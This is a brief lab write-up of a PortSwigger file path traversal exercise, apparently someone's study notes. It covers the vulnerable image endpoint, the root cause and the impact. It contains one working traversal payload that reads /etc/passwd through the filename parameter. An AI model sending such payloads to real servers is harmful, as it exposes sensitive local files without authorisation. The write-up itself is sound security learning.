# PortSwigger 01 - File Path Traversal, Simple Case

## What I tested

I tested an image-loading endpoint:

```http
GET /image?filename=4.jpg
```

## What I found

Changing the filename to a random value returned:

```txt
"No such file"
```

Using a basic traversal payload returned `/etc/passwd`:

```http
GET /image?filename=../../../etc/passwd
```

## Why it matters

The backend used the user-controlled `filename` parameter to read a file from the server filesystem.

## Root cause

The application did not validate the final resolved path before reading the file.

## Impact

An attacker could read sensitive local files from the server.

## Note to self

`filename` looked harmless because it loaded an image, but it still reached filesystem access.
